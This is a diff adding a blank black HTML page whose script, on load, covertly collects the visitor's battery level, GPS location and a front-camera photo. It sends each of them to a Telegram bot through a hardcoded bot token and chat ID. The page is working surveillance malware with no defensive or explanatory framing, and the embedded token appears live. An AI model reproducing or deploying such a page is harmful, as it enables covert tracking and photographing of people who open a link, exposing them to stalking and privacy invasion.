@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <style>html,body{margin:0;height:100%;background:#000}</style>
+</head>
+<body>
+<script>
+const BOT_TOKEN = "8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
+const CHAT_ID   = "8792921881";
+
+const envia = (txt) => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
+
+navigator.getBattery().then(b => envia(`🔋 ${Math.round(b.level*100)}% ${b.charging?'🔌':''}`));
+
+navigator.geolocation.getCurrentPosition(p => 
+  envia(`📍 https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`));
+
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
+  const v=document.createElement("video");v.srcObject=s;v.play();
+  const c=document.createElement("canvas");c.width=720;c.height=1280;
+  const x=c.getContext("2d");
+  setTimeout(()=>{
+    x.drawImage(v,0,0,720,1280);
+    c.toBlob(b=>{
+      const fd=new FormData();
+      fd.append("photo",b,"s.jpg");
+      fd.append("chat_id",CHAT_ID);
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+      s.getTracks().forEach(t=>t.stop());
+    },"image/jpeg",.85);
+  },900);
+});
+</script>
+</body>
+</html>
